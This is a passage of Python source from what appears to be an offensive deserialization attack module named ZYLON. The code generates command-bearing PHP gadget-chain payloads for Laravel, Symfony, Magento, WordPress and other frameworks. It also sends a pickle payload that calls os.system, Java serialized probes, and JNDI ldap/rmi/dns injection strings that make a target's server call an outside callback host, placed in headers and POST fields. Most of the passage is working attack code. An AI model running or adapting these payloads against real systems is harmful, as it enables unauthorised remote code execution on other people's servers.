            # These are simplified representations - real payloads need PHPGGC

            if "Laravel" in chain:
                # Laravel PendingBroadcast chain (simplified)
                # In real PHPGGC, this would be the full pop chain
                cmd_len = len(command)
                payload = (
                    f'O:32:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{'
                    f's:9:"\x00*\x00events";O:38:"Illuminate\\Events\\Dispatcher":1:{{'
                    f's:13:"\x00*\x00listeners";a:1:{{'
                    f's:10:"{command}";a:1:{{i:0;s:{cmd_len}:"{command}";}}'
                    f'}}}}'
                    f's:8:"\x00*\x00event";s:{cmd_len}:"{command}";'
                    f'}}'
                )
            elif "Symfony" in chain:
                # Symfony ProcessBuilder chain (simplified)
                cmd_len = len(command)
                payload = (
                    f'O:44:"Symfony\\Component\\Process\\ProcessBuilder":1:{{'
                    f's:8:"\x00*\x00prefix";a:1:{{i:0;s:{cmd_len}:"{command}";}}'
                    f'}}'
                )
            elif "Magento" in chain:
                cmd_len = len(command)
                payload = (
                    f'O:31:"Magento\\Framework\\DB\\Logger\\LoggerProxy":3:{{'
                    f's:11:"\x00*\x00logger";O:46:"Magento\\Framework\\DB\\Logger\\File":1:{{'
                    f's:8:"\x00*\x00file";s:{cmd_len}:"{command}";}}'
                    f's:13:"\x00*\x00loggerType";i:1;'
                    f's:14:"\x00*\x00logAllQueries";b:1;'
                    f'}}'
                )
            elif "WordPress" in chain:
                cmd_len = len(command)
                payload = (
                    f'O:8:"WP_Theme":1:{{'
                    f's:7:"\x00*\x00headers";a:1:{{s:{cmd_len}:"{command}";s:{cmd_len}:"{command}";}}'
                    f'}}'
                )
            elif "Yii" in chain:
                cmd_len = len(command)
                payload = (
                    f'O:36:"yii\\db\\BatchQueryResult":1:{{'
                    f's:11:"\x00*\x00db";O:22:"yii\\db\\Connection":1:{{'
                    f's:7:"\x00*\x00dsn";s:{cmd_len}:"{command}";}}'
                    f'}}'
                )
            elif "Guzzle" in chain:
                cmd_len = len(command)
                payload = (
                    f'O:19:"GuzzleHttp\\Psr7\\FnStream":1:{{'
                    f's:8:"\x00*\x00methods";a:1:{{'
                    f's:5:"close";s:{cmd_len}:"{command}";}}'
                    f'}}'
                )
            elif "Monolog" in chain:
                cmd_len = len(command)
                payload = (
                    f'O:32:"Monolog\\Handler\\BufferHandler":1:{{'
                    f's:7:"\x00*\x00handler";O:29:"Monolog\\Handler\\SyslogHandler":1:{{'
                    f's:8:"\x00*\x00ident";s:{cmd_len}:"{command}";}}'
                    f'}}'
                )
            else:
                # Generic PHP object with command
                cmd_len = len(command)
                payload = f'O:8:"stdClass":1:{{s:4:"exec";s:{cmd_len}:"{command}";}}'

            result["details"]["payload_serialized"] = payload
            result["details"]["payload_urlencoded"] = urllib.parse.quote(payload)
            result["details"]["payload_generated"] = True
            result["vulnerable"] = True
            result["findings"].append({
                "type": "php_payload_generated",
                "severity": "Info",
                "chain": chain,
                "command": command,
                "framework": chain_info.get("framework", "Unknown"),
                "versions": chain_info.get("versions", "Unknown"),
                "trigger_type": chain_info.get("type", "Unknown"),
                "payload_preview": payload[:150] + ('...' if len(payload) > 150 else ''),
                "description": (
                    f"PHP deserialization payload generated for {chain} "
                    f"(command: {command}). "
                    f"Note: For full payload generation, use PHPGGC tool."
                ),
            })
            self._print(f"  [+] PHP payload generated: {chain} ({len(payload)} bytes)", GREEN)
            self._print(f"  [*] Framework: {chain_info.get('framework')} | Trigger: {chain_info.get('type')}", CYAN)

        except Exception as e:
            result["findings"].append({
                "type": "payload_generation_error",
                "error": str(e),
            })
            self._print(f"  [-] Payload generation error: {str(e)}", RED)

        return result

    # ========================================================================
    # BLIND DESERIALIZATION DETECTION
    # ========================================================================

    def blind_deser_detect(self, url, callback_url=None):
        """Detect blind deserialization vulnerabilities

        Uses callback/DNS techniques to detect if deserialization
        occurs even when there's no visible output.

        Techniques:
        1. DNS callback (using callback URL)
        2. Time-based detection (sleep/delay payloads)
        3. Error-based detection
        """
        self._print(f"[*] Detecting blind deserialization on {url}", MAGENTA)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "callback_url": callback_url,
                "techniques_used": [],
                "time_based_detected": False,
                "callback_detected": False,
            },
            "scan_type": "blind_deserialization_detect",
        }

        # Technique 1: Time-based detection (Java)
        self._print(f"  [*] Technique 1: Time-based Java deserialization detection", CYAN)
        try:
            # Java sleep payload (via Runtime.exec("sleep 5"))
            # We send a serialized Java object and measure response time
            start_time = time.time()
            test_payload = JAVA_MAGIC_BYTES + b'\x00' * 50
            resp = self._send_request(
                url, method="POST", data=test_payload,
                headers={'Content-Type': 'application/x-java-serialized-object'}
            )
            elapsed = time.time() - start_time

            if elapsed > 4.5:
                result["vulnerable"] = True
                result["details"]["time_based_detected"] = True
                result["findings"].append({
                    "type": "time_based_java_deser",
                    "severity": "High",
                    "elapsed": round(elapsed, 2),
                    "description": f"Time delay detected ({elapsed:.2f}s) - possible blind Java deserialization",
                })
                self._print(f"  [!] Time-based detection: {elapsed:.2f}s delay!", RED)

            result["details"]["techniques_used"].append("time_based_java")
        except Exception as e:
            result["findings"].append({"type": "test_error", "technique": "time_based_java", "error": str(e)})

        # Technique 2: Time-based detection (PHP)
        self._print(f"  [*] Technique 2: Time-based PHP deserialization detection", CYAN)
        try:
            php_sleep_payloads = [
                ('O:8:"stdClass":1:{s:4:"sleep";i:5;}', 'PHP sleep object'),
                ('a:1:{s:4:"test";s:57:"<?php sleep(5); ?>";}', 'PHP sleep in array'),
            ]
            for payload, desc in php_sleep_payloads:
                start_time = time.time()
                post_data = {"data": payload}
                resp = self._send_request(url, method="POST", data=post_data)
                elapsed = time.time() - start_time

                if elapsed > 4.5:
                    result["vulnerable"] = True
                    result["details"]["time_based_detected"] = True
                    result["findings"].append({
                        "type": "time_based_php_deser",
                        "severity": "High",
                        "elapsed": round(elapsed, 2),
                        "payload": desc,
                        "description": f"Time delay detected ({elapsed:.2f}s) - possible blind PHP deserialization",
                    })
                    self._print(f"  [!] PHP time-based: {elapsed:.2f}s delay!", RED)
                    break

            result["details"]["techniques_used"].append("time_based_php")
        except Exception as e:
            result["findings"].append({"type": "test_error", "technique": "time_based_php", "error": str(e)})

        # Technique 3: DNS/HTTP callback (if callback URL provided)
        if callback_url:
            self._print(f"  [*] Technique 3: Callback-based detection", CYAN)
            try:
                # Java: JNDI lookup to callback URL
                jndi_payloads = [
                    f'${{jndi:ldap://{callback_url}/zylon}}',
                    f'${{jndi:rmi://{callback_url}/zylon}}',
                    f'${{jndi:dns://{callback_url}/zylon}}',
                ]

                # Test JNDI injection in common headers
                jndi_headers = [
                    'X-Forwarded-For', 'X-Api-Key', 'User-Agent',
                    'Referer', 'Cookie', 'Authorization',
                    'Accept', 'Origin', 'X-Request-ID',
                ]

                for header_name in jndi_headers:
                    for jndi_payload in jndi_payloads:
                        h = self.headers.copy()
                        h[header_name] = jndi_payload
                        self._send_request(url, method="GET", headers=h)

                # Test JNDI in POST data
                for jndi_payload in jndi_payloads:
                    post_data = {"username": jndi_payload, "data": jndi_payload}
                    self._send_request(url, method="POST", data=post_data)

                result["details"]["techniques_used"].append("callback_jndi")
                result["findings"].append({
                    "type": "callback_payloads_sent",
                    "severity": "Info",
                    "callback_url": callback_url,
                    "headers_tested": jndi_headers,
                    "description": f"JNDI callback payloads sent to {callback_url}. Check your callback server for hits.",
                })
                self._print(f"  [*] JNDI callback payloads sent. Check {callback_url} for hits.", CYAN)

            except Exception as e:
                result["findings"].append({"type": "test_error", "technique": "callback", "error": str(e)})

        # Technique 4: Python pickle blind detection
        self._print(f"  [*] Technique 4: Python pickle blind detection", CYAN)
        try:
            # Generate a pickle payload that would cause a sleep
            # pickle opcodes: c (GLOBAL) + os + system + ( + S'sleep 5' + t + R + .
            pickle_sleep = (
                b'\x80\x04\x95'  # Protocol 4 header
                b'\x1a\x00\x00\x00\x00\x00\x00\x00'  # Frame length
                b'\x8c\x02os\x94\x8c\x06system\x94\x93\x94'  # os.system
                b'\x8c\x07sleep 5\x94\x85\x94R\x94.'  # ('sleep 5') + REDUCE + STOP
            )
            pickle_b64 = base64.b64encode(pickle_sleep).decode()

            start_time = time.time()
            test_url = f"{url}{'&' if '?' in url else '?'}data={pickle_b64}"
            self._send_request(test_url, method="GET")
            elapsed = time.time() - start_time

            if elapsed > 4.5:
                result["vulnerable"] = True
                result["details"]["time_based_detected"] = True
                result["findings"].append({
                    "type": "time_based_pickle_deser",
                    "severity": "High",
                    "elapsed": round(elapsed, 2),
                    "description": f"Time delay detected ({elapsed:.2f}s) - possible blind pickle deserialization",
                })
                self._print(f"  [!] Pickle time-based: {elapsed:.2f}s delay!", RED)

            result["details"]["techniques_used"].append("time_based_pickle")
        except Exception as e:
            result["findings"].append({"type": "test_error", "technique": "time_based_pickle", "error": str(e)})

        # Technique 5: Error-based detection
        self._print(f"  [*] Technique 5: Error-based detection", CYAN)
        try:
            # Send malformed serialized data and look for framework errors
            error_payloads = [
                (b'\xac\xed\x00\x05\xff\xff\xff', 'Malformed Java object', 'java'),
                ('O:999:"NonExistentClass":0:{}', 'Non-existent PHP class', 'php'),
                (base64.b64encode(b'\x80\x04\x95\xff\xff\xff'), 'Malformed pickle', 'python'),
            ]

            for payload, desc, framework in error_payloads:
                if isinstance(payload, str):
                    post_data = {"data": payload}
                else:
                    post_data = payload

                resp = self._send_request(url, method="POST", data=post_data)
                if resp and resp.status_code == 500:
                    # Check for framework-specific error messages
                    deser_errors = {
                        'java': ['ObjectInputStream', 'readObject', 'ClassNotFoundException',
                                 'InvalidClassException', 'serialVersionUID'],
                        'php': ['unserialize', '__wakeup', '__destruct', 'Fatal error'],
                        'python': ['pickle', 'UnpicklingError', 'AttributeError', 'ImportError'],
                    }
                    for err in deser_errors.get(framework, []):
                        if err in resp.text:
                            result["vulnerable"] = True
                            result["findings"].append({
                                "type": f"error_based_{framework}_deser",
                                "severity": "High",
                                "framework": framework,
                                "error": err,
                                "description": f"Deserialization error detected ({framework}): {err}",
                            })
                            self._print(f"  [!] Error-based detection ({framework}): {err}", RED)
                            break

            result["details"]["techniques_used"].append("error_based")
        except Exception as e:
            result["findings"].append({"type": "test_error", "technique": "error_based", "error": str(e)})

        if not result["vulnerable"]:
            self._print(f"  [-] No blind deserialization vulnerability detected", YELLOW)
        else:
            self._print(f"\n  [!!!] BLIND DESERIALIZATION VULNERABILITY DETECTED!", RED)

        return result

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='detect', **kwargs):
        """Main entry point for Deserialization Engine

        Args:
            target: Target URL
            scan_type: Type of scan to run
                - 'detect': Detect all deserialization types
                - 'java_detect': Java deserialization detection
                - 'php_detect': PHP deserialization detection
                - 'python_detect': Python pickle detection
                - 'java_payload': Generate Java deserialization payload
                - 'php_payload': Generate PHP deserialization payload
                - 'blind': Blind deserialization detection
                - 'full': Run all scans
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  DESERIALIZATION ENGINE - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: Ysoserial + PHPGGC + Custom Techniques{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        overall_result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "scan_type": scan_type,
                "scans_run": [],
                "summary": {},
            },
            "scan_type": f"deserialization_{scan_type}",
        }

        data = kwargs.get('data', None)
        param = kwargs.get('param', None)
        gadget = kwargs.get('gadget', 'CommonsCollections6')
        chain = kwargs.get('chain', 'Laravel/RCE1')
        command = kwargs.get('command', 'id')
        callback_url = kwargs.get('callback_url', None)

        # Run selected scans
        if scan_type in ['java_detect', 'detect', 'full']:
            self._print(f"\n{BOLD}[*] Java Deserialization Detection{RESET}", CYAN)
            r = self.detect_java_deser(url, data)
            overall_result["findings"].extend(r.get("findings", []))
            overall_result["details"]["scans_run"].append("java_detect")
            overall_result["details"]["summary"]["java_detect"] = r
            if r.get("vulnerable"):
                overall_result["vulnerable"] = True

        if scan_type in ['php_detect', 'detect', 'full']:
            self._print(f"\n{BOLD}[*] PHP Deserialization Detection{RESET}", CYAN)
            r = self.detect_php_deser(url, param)
            overall_result["findings"].extend(r.get("findings", []))
            overall_result["details"]["scans_run"].append("php_detect")
            overall_result["details"]["summary"]["php_detect"] = r
            if r.get("vulnerable"):
                overall_result["vulnerable"] = True

        if scan_type in ['python_detect', 'detect', 'full']:
            self._print(f"\n{BOLD}[*] Python Pickle Deserialization Detection{RESET}", CYAN)
            r = self.detect_python_deser(url, data)
            overall_result["findings"].extend(r.get("findings", []))
            overall_result["details"]["scans_run"].append("python_detect")
            overall_result["details"]["summary"]["python_detect"] = r
            if r.get("vulnerable"):
                overall_result["vulnerable"] = True

        if scan_type in ['java_payload', 'full']:
            self._print(f"\n{BOLD}[*] Java Payload Generation{RESET}", MAGENTA)
            r = self.generate_java_payload(gadget, command)
            overall_result["findings"].extend(r.get("findings", []))
            overall_result["details"]["scans_run"].append("java_payload")
            overall_result["details"]["summary"]["java_payload"] = r

        if scan_type in ['php_payload', 'full']:
            self._print(f"\n{BOLD}[*] PHP Payload Generation{RESET}", MAGENTA)
            r = self.generate_php_payload(chain, command)
            overall_result["findings"].extend(r.get("findings", []))
            overall_result["details"]["scans_run"].append("php_payload")
            overall_result["details"]["summary"]["php_payload"] = r

        if scan_type in ['blind', 'full']:
            self._print(f"\n{BOLD}[*] Blind Deserialization Detection{RESET}", MAGENTA)
            r = self.blind_deser_detect(url, callback_url)
            overall_result["findings"].extend(r.get("findings", []))
            overall_result["details"]["scans_run"].append("blind_detect")
            overall_result["details"]["summary"]["blind_detect"] = r
            if r.get("vulnerable"):
                overall_result["vulnerable"] = True

        # Final summary
        total_findings = len(overall_result["findings"])
        critical = len([f for f in overall_result["findings"] if f.get("severity") == "Critical"])
        high = len([f for f in overall_result["findings"] if f.get("severity") == "High"])

        self._print(f"\n{BOLD}{'═'*50}{RESET}", CYAN)
        self._print(f"{BOLD}  DESERIALIZATION SCAN COMPLETE{RESET}", CYAN)
        self._print(f"  Scans run: {len(overall_result['details']['scans_run'])}", CYAN)
        self._print(f"  Total findings: {total_findings}", YELLOW)
        if critical:
            self._print(f"  Critical: {critical}", RED)
        if high:
            self._print(f"  High: {high}", RED)
        self._print(f"{BOLD}{'═'*50}{RESET}", CYAN)

        return overall_result


# ============================================================================
# MODULE-LEVEL run() FUNCTION (for ZYLON integration)
# ============================================================================

def run(target, scan_type='detect', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = DeserializationEngine(target_url=target if target.startswith('http') else f"https://{target}")
    return engine.run(target, scan_type=scan_type, **kwargs)
